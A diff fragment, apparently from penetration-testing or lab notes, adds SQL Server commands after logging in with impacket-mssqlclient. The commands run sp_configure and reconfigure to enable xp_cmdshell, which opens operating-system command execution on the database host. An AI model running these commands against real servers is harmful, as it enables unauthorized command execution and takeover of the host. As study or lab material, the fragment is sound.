@@ -75,7 +75,9 @@ valid user
 used impacket-mssqlclient
 
 EXEC sp_configure 'Show Advanced Options', 1;
-
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1
 reconfigure;
 
 
